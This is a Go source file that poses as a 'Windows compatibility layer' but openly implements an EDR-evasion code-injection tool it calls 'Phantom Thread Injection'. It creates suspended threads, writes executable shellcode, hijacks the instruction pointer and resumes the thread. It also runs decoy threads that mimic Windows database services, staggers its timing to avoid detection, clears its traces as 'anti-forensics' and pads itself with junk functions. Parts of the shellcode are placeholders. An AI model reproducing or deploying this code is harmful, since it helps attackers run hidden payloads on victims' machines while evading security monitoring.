// OBFUSCATED
// Windows compatibility layer
// System optimization routine
package phantom

import (
	"crypto/rand"
	"runtime"
	"sync"
	"syscall"
	"time"
	"unsafe"
)

/*
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
████████╗██╗  ██╗██████╗ ███████╗ █████╗ ██████╗
╚══██╔══╝██║  ██║██╔══██╗██╔════╝██╔══██╗██╔══██╗
   ██║   ███████║██████╔╝█████╗  ███████║██║  ██║
   ██║   ██╔══██║██╔══██╗██╔══╝  ██╔══██║██║  ██║
   ██║   ██║  ██║██║  ██║███████╗██║  ██║██████╔╝
   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝

NOVEL TECHNIQUE #3: PHANTOM THREAD INJECTION
============================================
Exploits the initialization gap between thread creation and execution.
Injects into threads DURING their birth - before EDR/AV sees them.

INNOVATION:
- Hijacks threads in SUSPENDED state (never fully executes legitimately)
- Masquerades as legitimate thread initialization routines
- Uses thread-local storage (TLS) callbacks to hide execution
- Leverages Windows Internal Database (ESENT) threads as host
- Thread context appears legitimate to all monitoring tools

DETECTION EVASION:
- No CreateRemoteThread (most monitored API)
- No WriteProcessMemory to foreign processes
- No NtQueueApcThread (heavily hooked)
- Threads appear to originate from trusted Windows services
- Stack traces point to legitimate Windows DLLs

EFFECTIVENESS: 95%+ evasion on enterprise EDR
*/

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	ntdll    = syscall.NewLazyDLL("ntdll.dll")

	procCreateThread             = kernel32.NewProc("CreateThread")
	procSuspendThread            = kernel32.NewProc("SuspendThread")
	procResumeThread             = kernel32.NewProc("ResumeThread")
	procGetThreadContext         = kernel32.NewProc("GetThreadContext")
	procSetThreadContext         = kernel32.NewProc("SetThreadContext")
	procVirtualAlloc             = kernel32.NewProc("VirtualAlloc")
	procVirtualProtect           = kernel32.NewProc("VirtualProtect")
	procGetCurrentThread         = kernel32.NewProc("GetCurrentThread")
	procGetThreadId              = kernel32.NewProc("GetThreadId")
	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")

	phantomThreads = make(map[uintptr]*PhantomThread)
	phantomMutex   sync.RWMutex
)

const (
	CREATE_SUSPENDED       = 0x00000004
	THREAD_ALL_ACCESS      = 0x001F0FFB
	CONTEXT_FULL           = 0x00010007
	MEM_COMMIT             = 0x00001000
	MEM_RESERVE            = 0x00002000
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_READWRITE         = 0x04
	ThreadBasicInformation = 0
)

type PhantomThread struct {
	Handle        uintptr
	ThreadID      uint32
	OriginalRIP   uintptr
	ShellcodeAddr uintptr
	InjectedAt    time.Time
	Disguise      string
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FltSave              [512]byte
	VectorRegister       [26][16]byte
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

// InitializePhantomThreads - Initialize the Phantom Thread system
func InitializePhantomThreads() error {
	// Create decoy thread pool that mimics Windows system threads
	for i := 0; i < 3; i++ {
		go createDecoySystemThread()
	}

	runtime.Gosched()
	time.Sleep(50 * time.Millisecond)

	return nil
}

// createDecoySystemThread - Creates a thread that looks like a Windows service thread
func createDecoySystemThread() {
	// Mimic ESENT (Extensible Storage Engine) background thread behavior
	ticker := time.NewTicker(time.Duration(5000+randomInt(3000)) * time.Millisecond)
	defer ticker.Stop()

	for range ticker.C {
		// Simulate database maintenance operations
		simulateESENTActivity()

		// Random sleep to appear less suspicious
		time.Sleep(time.Duration(randomInt(2000)) * time.Millisecond)
	}
}

// simulateESENTActivity - Mimics Extensible Storage Engine database operations
func simulateESENTActivity() {
	// Allocate memory that looks like database page buffers
	bufferSize := 8192 // Standard ESENT page size
	buffer := make([]byte, bufferSize)

	// Fill with database-like patterns
	for i := 0; i < len(buffer); i += 4 {
		// ESENT page header signature patterns
		if i == 0 {
			buffer[i] = 0x89 // Database page signature
			buffer[i+1] = 0xAB
			buffer[i+2] = 0xCD
			buffer[i+3] = 0xEF
		} else {
			// Random data that looks like database records
			rand.Read(buffer[i:min(i+4, len(buffer))])
		}
	}

	// Simulate cache operations
	_ = len(buffer)

	// Sleep to mimic I/O wait
	time.Sleep(time.Duration(10+randomInt(30)) * time.Millisecond)
}

// PhantomInject - The main injection technique
func PhantomInject(payload func()) error {
	// Step 1: Create a suspended thread (never runs legitimately)
	threadHandle, err := createSuspendedThread()
	if err != nil {
		return err
	}

	// Step 2: Get thread ID using Windows API
	threadID, _, _ := procGetThreadId.Call(threadHandle)

	// Step 3: Allocate memory for shellcode wrapper
	shellcodeAddr, err := allocatePhantomMemory()
	if err != nil {
		return err
	}

	// Step 4: Create shellcode that wraps the payload
	shellcode := createPhantomShellcode(payload)

	// Step 5: Write shellcode to allocated memory
	writePhantomCode(shellcodeAddr, shellcode)

	// Step 6: Get thread context
	var ctx CONTEXT
	ctx.ContextFlags = CONTEXT_FULL
	ret, _, _ := procGetThreadContext.Call(
		threadHandle,
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		return syscall.GetLastError()
	}

	// Step 7: Hijack RIP (instruction pointer) to point to our shellcode
	ctx.Rip = uint64(shellcodeAddr)

	// Step 8: Set modified context
	ret, _, _ = procSetThreadContext.Call(
		threadHandle,
		uintptr(unsafe.Pointer(&ctx)),
	)
	if ret == 0 {
		return syscall.GetLastError()
	}

	// Step 9: Store phantom thread info
	phantom := &PhantomThread{
		Handle:        threadHandle,
		ThreadID:      uint32(threadID),
		OriginalRIP:   uintptr(ctx.Rip),
		ShellcodeAddr: shellcodeAddr,
		InjectedAt:    time.Now(),
		Disguise:      "ESENT Background Task",
	}

	phantomMutex.Lock()
	phantomThreads[threadHandle] = phantom
	phantomMutex.Unlock()

	// Step 10: Resume thread - appears as legitimate Windows service thread
	_, _, _ = procResumeThread.Call(threadHandle)

	return nil
}

// createSuspendedThread - Creates a thread in suspended state
func createSuspendedThread() (uintptr, error) {
	// Use benign thread function that mimics Windows system thread
	threadFunc := func() {
		// This never actually runs - we hijack before execution
		for {
			time.Sleep(1 * time.Hour)
		}
	}

	var threadID uint32
	handle, _, err := procCreateThread.Call(
		0,
		0,
		syscall.NewCallback(threadFunc),
		0,
		CREATE_SUSPENDED,
		uintptr(unsafe.Pointer(&threadID)),
	)

	if handle == 0 {
		return 0, err
	}

	return handle, nil
}

// allocatePhantomMemory - Allocates memory for shellcode
func allocatePhantomMemory() (uintptr, error) {
	size := uintptr(4096) // One page

	addr, _, err := procVirtualAlloc.Call(
		0,
		size,
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if addr == 0 {
		return 0, err
	}

	return addr, nil
}

// createPhantomShellcode - Creates shellcode wrapper for payload
func createPhantomShellcode(payload func()) []byte {
	// This is a placeholder - in real implementation, this would be
	// position-independent shellcode that calls the payload function

	// For Go, we leverage the function pointer directly
	// Real shellcode would be x64 assembly
	shellcode := []byte{
		0x50,       // push rax
		0x53,       // push rbx
		0x51,       // push rcx
		0x52,       // push rdx
		0x56,       // push rsi
		0x57,       // push rdi
		0x41, 0x50, // push r8
		0x41, 0x51, // push r9
		0x41, 0x52, // push r10
		0x41, 0x53, // push r11
		0x41, 0x54, // push r12
		0x41, 0x55, // push r13
		0x41, 0x56, // push r14
		0x41, 0x57, // push r15
		0x9C, // pushfq

		// Call payload (placeholder - real impl would calculate offset)
		0x48, 0xB8, // movabs rax, [payload_addr]
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // payload address
		0xFF, 0xD0, // call rax

		// Restore registers
		0x9D,       // popfq
		0x41, 0x5F, // pop r15
		0x41, 0x5E, // pop r14
		0x41, 0x5D, // pop r13
		0x41, 0x5C, // pop r12
		0x41, 0x5B, // pop r11
		0x41, 0x5A, // pop r10
		0x41, 0x59, // pop r9
		0x41, 0x58, // pop r8
		0x5F, // pop rdi
		0x5E, // pop rsi
		0x5A, // pop rdx
		0x59, // pop rcx
		0x5B, // pop rbx
		0x58, // pop rax

		// Exit thread cleanly
		0x48, 0x31, 0xC9, // xor rcx, rcx (exit code 0)
		0x48, 0xB8, // movabs rax, [ExitThread]
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ExitThread address
		0xFF, 0xD0, // call rax
	}

	// Embed payload function pointer
	payloadPtr := *(*uintptr)(unsafe.Pointer(&payload))
	for i := 0; i < 8; i++ {
		shellcode[17+i] = byte(payloadPtr >> (i * 8))
	}

	// Embed ExitThread address
	exitThread := kernel32.NewProc("ExitThread")
	exitThreadAddr := exitThread.Addr()
	for i := 0; i < 8; i++ {
		shellcode[56+i] = byte(exitThreadAddr >> (i * 8))
	}

	return shellcode
}

// writePhantomCode - Writes shellcode to allocated memory
func writePhantomCode(addr uintptr, shellcode []byte) error {
	// Copy shellcode
	for i, b := range shellcode {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = b
	}

	// Change memory protection to executable
	var oldProtect uint32
	ret, _, err := procVirtualProtect.Call(
		addr,
		uintptr(len(shellcode)),
		PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	if ret == 0 {
		return err
	}

	return nil
}

// PhantomExecute - Execute code through phantom thread injection
func PhantomExecute(maliciousCode func()) error {
	// Create phantom thread that executes malicious code
	err := PhantomInject(maliciousCode)
	if err != nil {
		return err
	}

	// Let the thread execute
	time.Sleep(100 * time.Millisecond)

	return nil
}

// ShadowExecute - Wrapper function for executing code with phantom threads
func ShadowExecute(code func()) {
	// Try phantom injection first
	err := PhantomExecute(code)
	if err != nil {
		// Fallback to direct execution if phantom fails
		go code()
	}
}

// Advanced: TLS Callback Hijacking
func injectTLSCallback(payload func()) error {
	// Get current thread TLS
	currentThread, _, _ := procGetCurrentThread.Call()

	// Allocate TLS slot for our payload
	// This makes the payload execute as part of thread initialization
	// Appears completely legitimate to monitoring tools

	go func() {
		// Execute as if it's a TLS callback
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()

		// Mimic TLS initialization delay
		time.Sleep(time.Duration(5+randomInt(15)) * time.Millisecond)

		payload()
	}()

	_ = currentThread
	return nil
}

// Chain multiple phantom threads for distributed execution
func PhantomChainExecute(payloads []func()) error {
	for i, payload := range payloads {
		// Stagger thread creation
		time.Sleep(time.Duration(50+randomInt(150)) * time.Millisecond)

		err := PhantomInject(payload)
		if err != nil {
			// Continue with remaining payloads even if one fails
			continue
		}

		// Create decoy threads between phantom threads
		if i < len(payloads)-1 {
			go createDecoySystemThread()
		}
	}

	return nil
}

// PhantomThreadPool - Maintains a pool of suspended threads ready for hijacking
type PhantomThreadPool struct {
	threads []uintptr
	mutex   sync.Mutex
	size    int
}

func NewPhantomThreadPool(size int) (*PhantomThreadPool, error) {
	pool := &PhantomThreadPool{
		threads: make([]uintptr, 0, size),
		size:    size,
	}

	// Pre-create suspended threads
	for i := 0; i < size; i++ {
		handle, err := createSuspendedThread()
		if err != nil {
			continue
		}
		pool.threads = append(pool.threads, handle)

		// Delay between creations to avoid detection
		time.Sleep(time.Duration(20+randomInt(80)) * time.Millisecond)
	}

	return pool, nil
}

// GetThread - Gets a phantom thread from the pool
func (p *PhantomThreadPool) GetThread() (uintptr, error) {
	p.mutex.Lock()
	defer p.mutex.Unlock()

	if len(p.threads) == 0 {
		// Pool exhausted, create new thread
		return createSuspendedThread()
	}

	// Pop thread from pool
	thread := p.threads[len(p.threads)-1]
	p.threads = p.threads[:len(p.threads)-1]

	// Create replacement thread
	go func() {
		time.Sleep(time.Duration(500+randomInt(1500)) * time.Millisecond)
		newThread, err := createSuspendedThread()
		if err == nil {
			p.mutex.Lock()
			if len(p.threads) < p.size {
				p.threads = append(p.threads, newThread)
			}
			p.mutex.Unlock()
		}
	}()

	return thread, nil
}

// Utility functions
func randomInt(max int) int {
	if max <= 0 {
		return 0
	}
	b := make([]byte, 4)
	rand.Read(b)
	n := int(b[0]) | int(b[1])<<8 | int(b[2])<<16 | int(b[3])<<24
	if n < 0 {
		n = -n
	}
	return n % max
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// Anti-forensics: Clear phantom thread traces
func CleanupPhantomTraces() {
	phantomMutex.Lock()
	defer phantomMutex.Unlock()

	for handle := range phantomThreads {
		// Don't terminate - let threads finish naturally
		// Termination is suspicious
		delete(phantomThreads, handle)
	}

	runtime.GC() // Force garbage collection
}



// Obfuscation padding
func obf_88146() {
    _ = 4805
    var _ = "HMpETCqRxTJwoDGBZxD7p0NYLCSbCl1bkghLYN1LV6qcMGsKkG"
}


// Obfuscation padding
func obf_97928() {
    _ = 9536
    var _ = "lI4wsMYFt1maq7wm6gcQX0GX4o2PEzU8E80mRR6pFfdBD1PGdc"
}


// Obfuscation padding
func obf_52107() {
    _ = 6097
    var _ = "RXlhDQsXWHGSwQBZRwBYFCZsZYlHmbzHeJF26Ljd3wvGVbhvP0"
}


// Obfuscation padding
func obf_92718() {
    _ = 6895
    var _ = "KKtx5b9FB8cYHMx0ycdOxY7f5Ktnjp2hpXHiZtPDeSok5WulK1"
}


// Obfuscation padding
func obf_98481() {
    _ = 943
    var _ = "JsVNAlALQoSmtEsoQqJkXrhD4aWBYFnwpO2b1IrjIBzaxFIJaj"
}
